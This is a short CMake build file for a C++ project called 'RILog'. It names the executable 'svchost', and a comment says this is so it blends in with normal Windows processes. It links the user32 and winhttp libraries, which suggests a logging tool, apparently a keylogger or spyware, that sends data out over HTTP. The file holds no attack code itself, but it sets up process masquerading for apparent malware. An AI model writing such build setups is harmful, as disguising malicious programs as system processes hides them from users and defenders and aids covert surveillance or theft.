cmake_minimum_required(VERSION 3.10)
project(RILog)

set(CMAKE_CXX_STANDARD 17)

# Add the executable - renaming it to blend in with normal Windows processes
add_executable(svchost main.cpp)

# Link against necessary Windows libraries
target_link_libraries(svchost user32 winhttp)
